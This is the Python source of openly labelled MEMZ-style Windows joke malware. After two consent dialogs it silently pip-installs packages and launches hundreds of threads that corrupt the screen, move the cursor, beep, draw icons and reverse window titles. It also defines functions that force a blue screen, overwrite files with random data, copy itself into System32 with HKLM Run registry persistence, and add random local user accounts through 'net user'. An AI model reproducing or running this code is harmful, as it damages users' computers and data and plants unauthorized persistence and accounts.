import ctypes
import os
import shutil
import string
import subprocess
import sys
import threading
import time

import winsound
from  ctypes import *
from ctypes.wintypes import *

import getpass
import random
dll = windll.LoadLibrary("user32.dll")
ntdll = windll.LoadLibrary("ntdll.dll")
gdidll = windll.LoadLibrary("gdi32.dll")
winmmdll = windll.LoadLibrary("winmm.dll")
kerdll = windll.LoadLibrary("kernel32.dll")
func = dll.MessageBoxW



if func(0, u"The software just executed is considered malware \r\n"
                           u"This malware will harm your computer and makes it unusable!"
              u"If you are seeing this message without knowing what you just executed, simply press NO(否) and nothing "
           u"will happen ."
              u"\r\n"
              u"If you know what this malware does and are using a safe environment to test, press YES(是) to start "
           u"it. \r\n"
              u"\r\n"
              u"DO YOU WANT EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"
           u"\n\n\n"
           u"Chinese：\n"
           u"刚刚执行的软件被认为是恶意软件\n此恶意软件将危害您的计算机并使其无法使用！\n如果您看到这条消息而不知道您刚刚执行了什么，只需按“否”，什么都不会发生。\n"
           u"如果您知道此恶意软件的作用，并且正在使用安全的环境进行测试，请按“是”启动它。\n你想执行这个恶意软件，导致一台无法使用的机器吗？","MEMZ" ,0x34) == 6:
    if func(0, "THIS IS LAST WARNING! \r\n"
               "\r\n"
               "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE\r\n"
               "STILL EXECUTE IT?"
               "\n\n\n"
               "Chinese：\n"
               "这是最后一次警告！\n创建者不对使用此恶意软件造成的任何损坏负责\n\n还执行吗???", "MEMZ", 0x34) == 6:
        pass
    else:
        exit()
else:
    exit()

os.system("pip install VirtualKey > nul")
import VirtualKey
os.system("pip install pypiwin32 >nul")
import win32gui, win32api, win32con
os.system("pip install psutil >nul")



wide = dll.GetSystemMetrics(0) * 3
high = dll.GetSystemMetrics(1) * 3
print(wide, high)
def blue():
    ErrKill = c_char()
    HDErr = c_long(0)
    ntdll.RtlAdjPriv(0x13, c_bool(True), c_bool(False), pointer(ErrKill))
    ntdll.NtRaiseHardErr(0xc0000233, c_int(0), c_int(0), pointer(HDErr))


def win():
    func(0, u"Still using this computer?", "lol", 0x1030)


def re(hwnd, param):
    a = win32gui.GetWindowText(hwnd)
    a = list(a)
    a.reverse()
    a = "".join(a)
    win32gui.SetWindowText(hwnd, a)
def mbr():
    pass

def sum_file(proname):
    a = open("C:\\a.py", "w")
    a.write()
def no_kill():
    os.system("start .\\closeIt.exe")



def cursor():
    class Point(Structure):
        _fields_ = [("x", c_long), ("y", c_long)]
    q  = Point(0,0)
    dll.GetCursorPos(pointer(q))
    v2 = 10
    v3 = random.randint(0, v2)
    v5 = random.randint(0, v2)
    v7 = random.randint(0, 1000)
    v11 = q.y + v3 * (v7 % 3 - 1)
    v9 = random.randint(0, 1000)
    v12 = q.x + v5 * (v9 % 3 - 1)
    dll.SetCursorPos(v11, v12)

def web():
    windll.shell32.ShellExecuteW(0, "open", "baidu.com/yyg-yyds", 0, 0, 10)


def desktop():
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    v0 = HWND
    v1 = HDC
    Rect = RECT(random.randint(0, wide), random.randint(0, high), random.randint(0, wide), random.randint(0, high))
    v0 = dll.GetDesktopWindow()
    v1 = dll.GetWindowDC(v0)


    print(Rect.top, Rect.bottom, Rect.left, Rect.right)
    gdidll.BitBlt(v1, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, v1, 0, 0, 0x330008)
    dll.ReleaseDC(v0, v1)

def drawIco():
    hWnd = HWND
    hicon1 = HICON
    hicon2 = HICON
    iconw = c_int
    iconh = c_int
    class Point(Structure):
        _fields_ = [("x", c_long), ("y", c_long)]
    p = Point(0,0)
    iconw = dll.GetSystemMetrics(11) / 2
    iconh = dll.GetSystemMetrics(12) / 2
    hWnd = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(hWnd)
    dll.GetCursorPos(pointer(p))
    hicon1 = dll.LoadIconW(0, 0x7F01)
    dll.DrawIcon(v2, int(p.x - iconw), int(p.y - iconh), hicon1)


    hicon2 = dll.LoadIconW(0, 0x7F03)
    x = random.randint(0, wide)
    y = random.randint(0, high)
    dll.DrawIcon(v2, x, y, hicon2)

def desktop_small():
    v1 = HWND
    v2 = HDC
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    Rect = RECT(random.randint(0, wide), random.randint(0, high), random.randint(0, wide), random.randint(0, high))

    v1 = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(v1)
    gdidll.StretchBlt(v2, 50, 50, Rect.right - 100, Rect.bottom - 100, v2, 0, 0, Rect.right, Rect.bottom, 0xCC0020)
    dll.ReleaseDC(v1, v2)

def desk_copy():
    v1 = HWND
    v2 = HDC
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    Rect = RECT(random.randint(100, wide), random.randint(100, high), random.randint(100, wide), random.randint(100, high))

    v1 = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(v1)
    x = random.randint(0, Rect.right - 100)
    y = random.randint(0, Rect.bottom - 100)
    m = random.randint(0, 600)
    n = random.randint(0, 600)
    p = random.randint(0, Rect.right - 100)
    q = random.randint(0, Rect.bottom - 100)
    gdidll.BitBlt(v2, x, y, m, n, v2, p, q, 0xCC0020)
def sound():
    s = [winsound.MB_OK, winsound.MB_ICONHAND, winsound.MB_ICONQUESTION, winsound.MB_ICONEXCLAMATION]
    s1 = random.choice(s)
    winsound.MessageBeep(type=s1)

def presskey():
    char = string.punctuation + string.ascii_letters
    char = list(char)

    VirtualKey.example.down_up(random.choice(char))
# warning func
def smashfile(file):
    with open(file, "w") as f:
        for i in range(random.randint(0, 2000)):
            f.write(random.choice(list(string.punctuation + string.ascii_letters + string.digits + string.hexdigits + string.octdigits)))


def reg_booting_start():

    shutil.copyfile(__file__, "C:\\Windows\\System32\\drivers\\sp000drv.exe")
    shutil.copyfile(__file__, "C:\\Windows\\System32\\drivers\\sp000dsk.py")
    os.system(r"reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsDrvM /t REG_SZ /d ^%systemroot%\System32\drivers\spl000drv.exe")
    os.system(r"reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsDrvX /t REG_SZ /d ^%systemroot%\System32\drivers\spl000dsk.py")



def some_user():

    #os.system("net user NoEscape death /add")
    # warning

    user = getpass.getuser()
    p = "!#()_"
    ua = list(p + string.ascii_letters + string.digits)
    del_bat = True

    for i in range(5):
        st = ""
        for j in range(20):
            st += random.choice(ua)
        ps = ""
        for j in range(14):
            ps += random.choice(ua)
        print(f"net user {''.join(st)} {''.join(ps)} /add")
        subprocess.run(f"net user {st} {ps} /add")
        if del_bat:
            a = open("del_bat.bat", "a")
            print(f"net user {st} /delete", file=a)



def fungame(num, f=None):
    if f is None:
        f = [sound,
             sound,
             sound,
             desktop_small,
             desktop_small,
             desktop_small,
             desktop,
             desktop,
             desk_copy,
             web,
             drawIco,
             drawIco,
             drawIco,
             cursor,
             cursor,
             cursor,
             lambda: win32gui.EnumChildWindows(win32gui.GetDesktopWindow(), re, 0)
             ]
    while num:
        time.sleep(0.02)
        threading.Thread(target=random.choice(f)).start()
        num -= 1
fungame(300)
